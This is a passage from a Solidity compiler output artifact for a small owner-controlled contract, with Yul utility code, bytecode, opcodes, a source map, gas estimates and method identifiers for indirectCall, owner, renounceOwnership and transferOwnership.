lots":0,"returnSlots":1},"@renounceOwnership_98":{"entryPoint":284,"id":98,"parameterSlots":0,"returnSlots":0},"@transferOwnership_126":{"entryPoint":345,"id":126,"parameterSlots":1,"returnSlots":0},"abi_decode_t_address":{"entryPoint":896,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address":{"entryPoint":917,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":962,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":977,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"cleanup_t_address":{"entryPoint":855,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":823,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":818,"id":null,"parameterSlots":0,"returnSlots":0},"validator_revert_t_address":{"entryPoint":873,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:1525:14","nodeType":"YulBlock","src":"0:1525:14","statements":[{"body":{"nativeSrc":"47:35:14","nodeType":"YulBlock","src":"47:35:14","statements":[{"nativeSrc":"57:19:14","nodeType":"YulAssignment","src":"57:19:14","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:14","nodeType":"YulLiteral","src":"73:2:14","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:14","nodeType":"YulIdentifier","src":"67:5:14"},"nativeSrc":"67:9:14","nodeType":"YulFunctionCall","src":"67:9:14"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:14","nodeType":"YulIdentifier","src":"57:6:14"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:14","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:14","nodeType":"YulTypedName","src":"40:6:14","type":""}],"src":"7:75:14"},{"body":{"nativeSrc":"177:28:14","nodeType":"YulBlock","src":"177:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:14","nodeType":"YulLiteral","src":"194:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:14","nodeType":"YulLiteral","src":"197:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:14","nodeType":"YulIdentifier","src":"187:6:14"},"nativeSrc":"187:12:14","nodeType":"YulFunctionCall","src":"187:12:14"},"nativeSrc":"187:12:14","nodeType":"YulExpressionStatement","src":"187:12:14"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:14","nodeType":"YulFunctionDefinition","src":"88:117:14"},{"body":{"nativeSrc":"300:28:14","nodeType":"YulBlock","src":"300:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:14","nodeType":"YulLiteral","src":"317:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:14","nodeType":"YulLiteral","src":"320:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:14","nodeType":"YulIdentifier","src":"310:6:14"},"nativeSrc":"310:12:14","nodeType":"YulFunctionCall","src":"310:12:14"},"nativeSrc":"310:12:14","nodeType":"YulExpressionStatement","src":"310:12:14"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:14","nodeType":"YulFunctionDefinition","src":"211:117:14"},{"body":{"nativeSrc":"379:81:14","nodeType":"YulBlock","src":"379:81:14","statements":[{"nativeSrc":"389:65:14","nodeType":"YulAssignment","src":"389:65:14","value":{"arguments":[{"name":"value","nativeSrc":"404:5:14","nodeType":"YulIdentifier","src":"404:5:14"},{"kind":"number","nativeSrc":"411:42:14","nodeType":"YulLiteral","src":"411:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"400:3:14","nodeType":"YulIdentifier","src":"400:3:14"},"nativeSrc":"400:54:14","nodeType":"YulFunctionCall","src":"400:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:14","nodeType":"YulIdentifier","src":"389:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"334:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:14","nodeType":"YulTypedName","src":"361:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:14","nodeType":"YulTypedName","src":"371:7:14","type":""}],"src":"334:126:14"},{"body":{"nativeSrc":"511:51:14","nodeType":"YulBlock","src":"511:51:14","statements":[{"nativeSrc":"521:35:14","nodeType":"YulAssignment","src":"521:35:14","value":{"arguments":[{"name":"value","nativeSrc":"550:5:14","nodeType":"YulIdentifier","src":"550:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"532:17:14","nodeType":"YulIdentifier","src":"532:17:14"},"nativeSrc":"532:24:14","nodeType":"YulFunctionCall","src":"532:24:14"},"variableNames":[{"name":"cleaned","nativeSrc":"521:7:14","nodeType":"YulIdentifier","src":"521:7:14"}]}]},"name":"cleanup_t_address","nativeSrc":"466:96:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"493:5:14","nodeType":"YulTypedName","src":"493:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"503:7:14","nodeType":"YulTypedName","src":"503:7:14","type":""}],"src":"466:96:14"},{"body":{"nativeSrc":"611:79:14","nodeType":"YulBlock","src":"611:79:14","statements":[{"body":{"nativeSrc":"668:16:14","nodeType":"YulBlock","src":"668:16:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"677:1:14","nodeType":"YulLiteral","src":"677:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"680:1:14","nodeType":"YulLiteral","src":"680:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"670:6:14","nodeType":"YulIdentifier","src":"670:6:14"},"nativeSrc":"670:12:14","nodeType":"YulFunctionCall","src":"670:12:14"},"nativeSrc":"670:12:14","nodeType":"YulExpressionStatement","src":"670:12:14"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"634:5:14","nodeType":"YulIdentifier","src":"634:5:14"},{"arguments":[{"name":"value","nativeSrc":"659:5:14","nodeType":"YulIdentifier","src":"659:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"641:17:14","nodeType":"YulIdentifier","src":"641:17:14"},"nativeSrc":"641:24:14","nodeType":"YulFunctionCall","src":"641:24:14"}],"functionName":{"name":"eq","nativeSrc":"631:2:14","nodeType":"YulIdentifier","src":"631:2:14"},"nativeSrc":"631:35:14","nodeType":"YulFunctionCall","src":"631:35:14"}],"functionName":{"name":"iszero","nativeSrc":"624:6:14","nodeType":"YulIdentifier","src":"624:6:14"},"nativeSrc":"624:43:14","nodeType":"YulFunctionCall","src":"624:43:14"},"nativeSrc":"621:63:14","nodeType":"YulIf","src":"621:63:14"}]},"name":"validator_revert_t_address","nativeSrc":"568:122:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"604:5:14","nodeType":"YulTypedName","src":"604:5:14","type":""}],"src":"568:122:14"},{"body":{"nativeSrc":"748:87:14","nodeType":"YulBlock","src":"748:87:14","statements":[{"nativeSrc":"758:29:14","nodeType":"YulAssignment","src":"758:29:14","value":{"arguments":[{"name":"offset","nativeSrc":"780:6:14","nodeType":"YulIdentifier","src":"780:6:14"}],"functionName":{"name":"calldataload","nativeSrc":"767:12:14","nodeType":"YulIdentifier","src":"767:12:14"},"nativeSrc":"767:20:14","nodeType":"YulFunctionCall","src":"767:20:14"},"variableNames":[{"name":"value","nativeSrc":"758:5:14","nodeType":"YulIdentifier","src":"758:5:14"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"823:5:14","nodeType":"YulIdentifier","src":"823:5:14"}],"functionName":{"name":"validator_revert_t_address","nativeSrc":"796:26:14","nodeType":"YulIdentifier","src":"796:26:14"},"nativeSrc":"796:33:14","nodeType":"YulFunctionCall","src":"796:33:14"},"nativeSrc":"796:33:14","nodeType":"YulExpressionStatement","src":"796:33:14"}]},"name":"abi_decode_t_address","nativeSrc":"696:139:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"726:6:14","nodeType":"YulTypedName","src":"726:6:14","type":""},{"name":"end","nativeSrc":"734:3:14","nodeType":"YulTypedName","src":"734:3:14","type":""}],"returnVariables":[{"name":"value","nativeSrc":"742:5:14","nodeType":"YulTypedName","src":"742:5:14","type":""}],"src":"696:139:14"},{"body":{"nativeSrc":"907:263:14","nodeType":"YulBlock","src":"907:263:14","statements":[{"body":{"nativeSrc":"953:83:14","nodeType":"YulBlock","src":"953:83:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"955:77:14","nodeType":"YulIdentifier","src":"955:77:14"},"nativeSrc":"955:79:14","nodeType":"YulFunctionCall","src":"955:79:14"},"nativeSrc":"955:79:14","nodeType":"YulExpressionStatement","src":"955:79:14"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"928:7:14","nodeType":"YulIdentifier","src":"928:7:14"},{"name":"headStart","nativeSrc":"937:9:14","nodeType":"YulIdentifier","src":"937:9:14"}],"functionName":{"name":"sub","nativeSrc":"924:3:14","nodeType":"YulIdentifier","src":"924:3:14"},"nativeSrc":"924:23:14","nodeType":"YulFunctionCall","src":"924:23:14"},{"kind":"number","nativeSrc":"949:2:14","nodeType":"YulLiteral","src":"949:2:14","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"920:3:14","nodeType":"YulIdentifier","src":"920:3:14"},"nativeSrc":"920:32:14","nodeType":"YulFunctionCall","src":"920:32:14"},"nativeSrc":"917:119:14","nodeType":"YulIf","src":"917:119:14"},{"nativeSrc":"1046:117:14","nodeType":"YulBlock","src":"1046:117:14","statements":[{"nativeSrc":"1061:15:14","nodeType":"YulVariableDeclaration","src":"1061:15:14","value":{"kind":"number","nativeSrc":"1075:1:14","nodeType":"YulLiteral","src":"1075:1:14","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1065:6:14","nodeType":"YulTypedName","src":"1065:6:14","type":""}]},{"nativeSrc":"1090:63:14","nodeType":"YulAssignment","src":"1090:63:14","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1125:9:14","nodeType":"YulIdentifier","src":"1125:9:14"},{"name":"offset","nativeSrc":"1136:6:14","nodeType":"YulIdentifier","src":"1136:6:14"}],"functionName":{"name":"add","nativeSrc":"1121:3:14","nodeType":"YulIdentifier","src":"1121:3:14"},"nativeSrc":"1121:22:14","nodeType":"YulFunctionCall","src":"1121:22:14"},{"name":"dataEnd","nativeSrc":"1145:7:14","nodeType":"YulIdentifier","src":"1145:7:14"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"1100:20:14","nodeType":"YulIdentifier","src":"1100:20:14"},"nativeSrc":"1100:53:14","nodeType":"YulFunctionCall","src":"1100:53:14"},"variableNames":[{"name":"value0","nativeSrc":"1090:6:14","nodeType":"YulIdentifier","src":"1090:6:14"}]}]}]},"name":"abi_decode_tuple_t_address","nativeSrc":"841:329:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"877:9:14","nodeType":"YulTypedName","src":"877:9:14","type":""},{"name":"dataEnd","nativeSrc":"888:7:14","nodeType":"YulTypedName","src":"888:7:14","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"900:6:14","nodeType":"YulTypedName","src":"900:6:14","type":""}],"src":"841:329:14"},{"body":{"nativeSrc":"1241:53:14","nodeType":"YulBlock","src":"1241:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1258:3:14","nodeType":"YulIdentifier","src":"1258:3:14"},{"arguments":[{"name":"value","nativeSrc":"1281:5:14","nodeType":"YulIdentifier","src":"1281:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"1263:17:14","nodeType":"YulIdentifier","src":"1263:17:14"},"nativeSrc":"1263:24:14","nodeType":"YulFunctionCall","src":"1263:24:14"}],"functionName":{"name":"mstore","nativeSrc":"1251:6:14","nodeType":"YulIdentifier","src":"1251:6:14"},"nativeSrc":"1251:37:14","nodeType":"YulFunctionCall","src":"1251:37:14"},"nativeSrc":"1251:37:14","nodeType":"YulExpressionStatement","src":"1251:37:14"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"1176:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1229:5:14","nodeType":"YulTypedName","src":"1229:5:14","type":""},{"name":"pos","nativeSrc":"1236:3:14","nodeType":"YulTypedName","src":"1236:3:14","type":""}],"src":"1176:118:14"},{"body":{"nativeSrc":"1398:124:14","nodeType":"YulBlock","src":"1398:124:14","statements":[{"nativeSrc":"1408:26:14","nodeType":"YulAssignment","src":"1408:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"1420:9:14","nodeType":"YulIdentifier","src":"1420:9:14"},{"kind":"number","nativeSrc":"1431:2:14","nodeType":"YulLiteral","src":"1431:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1416:3:14","nodeType":"YulIdentifier","src":"1416:3:14"},"nativeSrc":"1416:18:14","nodeType":"YulFunctionCall","src":"1416:18:14"},"variableNames":[{"name":"tail","nativeSrc":"1408:4:14","nodeType":"YulIdentifier","src":"1408:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"1488:6:14","nodeType":"YulIdentifier","src":"1488:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"1501:9:14","nodeType":"YulIdentifier","src":"1501:9:14"},{"kind":"number","nativeSrc":"1512:1:14","nodeType":"YulLiteral","src":"1512:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1497:3:14","nodeType":"YulIdentifier","src":"1497:3:14"},"nativeSrc":"1497:17:14","nodeType":"YulFunctionCall","src":"1497:17:14"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"1444:43:14","nodeType":"YulIdentifier","src":"1444:43:14"},"nativeSrc":"1444:71:14","nodeType":"YulFunctionCall","src":"1444:71:14"},"nativeSrc":"1444:71:14","nodeType":"YulExpressionStatement","src":"1444:71:14"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nativeSrc":"1300:222:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1370:9:14","nodeType":"YulTypedName","src":"1370:9:14","type":""},{"name":"value0","nativeSrc":"1382:6:14","nodeType":"YulTypedName","src":"1382:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1393:4:14","nodeType":"YulTypedName","src":"1393:4:14","type":""}],"src":"1300:222:14"}]},"contents":"{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b506004361061004c5760003560e01c80636ee6199f14610051578063715018a61461006d5780638da5cb5b14610077578063f2fde38b14610095575b600080fd5b61006b60048036038101906100669190610395565b6100b1565b005b61007561011c565b005b61007f610130565b60405161008c91906103d1565b60405180910390f35b6100af60048036038101906100aa9190610395565b610159565b005b6100b96101df565b8073ffffffffffffffffffffffffffffffffffffffff166382cb05c66040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010157600080fd5b505af1158015610115573d6000803e3d6000fd5b5050505050565b6101246101df565b61012e6000610266565b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6101616101df565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036101d35760006040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016101ca91906103d1565b60405180910390fd5b6101dc81610266565b50565b6101e761032a565b73ffffffffffffffffffffffffffffffffffffffff16610205610130565b73ffffffffffffffffffffffffffffffffffffffff16146102645761022861032a565b6040517f118cdaa700000000000000000000000000000000000000000000000000000000815260040161025b91906103d1565b60405180910390fd5b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600033905090565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061036282610337565b9050919050565b61037281610357565b811461037d57600080fd5b50565b60008135905061038f81610369565b92915050565b6000602082840312156103ab576103aa610332565b5b60006103b984828501610380565b91505092915050565b6103cb81610357565b82525050565b60006020820190506103e660008301846103c2565b9291505056fea2646970667358221220f5348b753442be450129087b7a707bd74a3137133c2f61b87958c83332df846b64736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6EE6199F EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x77 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x95 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x66 SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST PUSH2 0xB1 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x75 PUSH2 0x11C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x7F PUSH2 0x130 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8C SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAF PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xAA SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST PUSH2 0x159 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB9 PUSH2 0x1DF JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x82CB05C6 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x101 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x115 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH2 0x124 PUSH2 0x1DF JUMP JUMPDEST PUSH2 0x12E PUSH1 0x0 PUSH2 0x266 JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x161 PUSH2 0x1DF JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x1D3 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1CA SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1DC DUP2 PUSH2 0x266 JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x1E7 PUSH2 0x32A JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x205 PUSH2 0x130 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x264 JUMPI PUSH2 0x228 PUSH2 0x32A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x25B SWAP2 SWAP1 PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x362 DUP3 PUSH2 0x337 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x372 DUP2 PUSH2 0x357 JUMP JUMPDEST DUP2 EQ PUSH2 0x37D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x38F DUP2 PUSH2 0x369 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3AB JUMPI PUSH2 0x3AA PUSH2 0x332 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x3B9 DUP5 DUP3 DUP6 ADD PUSH2 0x380 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3CB DUP2 PUSH2 0x357 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3E6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 CALLVALUE DUP12 PUSH22 0x3442BE450129087B7A707BD74A3137133C2F61B87958 0xC8 CALLER ORIGIN 0xDF DUP5 PUSH12 0x64736F6C634300081C003300 ","sourceMap":"209:174:9:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;287:94;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;2293:101:0;;;:::i;:::-;;1638:85;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2543:215;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;287:94:9;1531:13:0;:11;:13::i;:::-;356:6:9::1;348:26;;;:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;287:94:::0;:::o;2293:101:0:-;1531:13;:11;:13::i;:::-;2357:30:::1;2384:1;2357:18;:30::i;:::-;2293:101::o:0;1638:85::-;1684:7;1710:6;;;;;;;;;;;1703:13;;1638:85;:::o;2543:215::-;1531:13;:11;:13::i;:::-;2647:1:::1;2627:22;;:8;:22;;::::0;2623:91:::1;;2700:1;2672:31;;;;;;;;;;;:::i;:::-;;;;;;;;2623:91;2723:28;2742:8;2723:18;:28::i;:::-;2543:215:::0;:::o;1796:162::-;1866:12;:10;:12::i;:::-;1855:23;;:7;:5;:7::i;:::-;:23;;;1851:101;;1928:12;:10;:12::i;:::-;1901:40;;;;;;;;;;;:::i;:::-;;;;;;;;1851:101;1796:162::o;2912:187::-;2985:16;3004:6;;;;;;;;;;;2985:25;;3029:8;3020:6;;:17;;;;;;;;;;;;;;;;;;3083:8;3052:40;;3073:8;3052:40;;;;;;;;;;;;2975:124;2912:187;:::o;656:96:1:-;709:7;735:10;728:17;;656:96;:::o;88:117:14:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:329::-;900:6;949:2;937:9;928:7;924:23;920:32;917:119;;;955:79;;:::i;:::-;917:119;1075:1;1100:53;1145:7;1136:6;1125:9;1121:22;1100:53;:::i;:::-;1090:63;;1046:117;841:329;;;;:::o;1176:118::-;1263:24;1281:5;1263:24;:::i;:::-;1258:3;1251:37;1176:118;;:::o;1300:222::-;1393:4;1431:2;1420:9;1416:18;1408:26;;1444:71;1512:1;1501:9;1497:17;1488:6;1444:71;:::i;:::-;1300:222;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"211600","executionCost":"infinite","totalCost":"infinite"},"external":{"indirectCall(address)":"infinite","owner()":"2544","renounceOwnership()":"infinite","transferOwnership(address)":"infinite"}},"methodIdentifiers":{"indirectCall(address)":"6ee6199f","owner()":"8da5cb5b","renounceOwnership()":"715018a6","transferOwnership(address)":"f2fde38b"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\"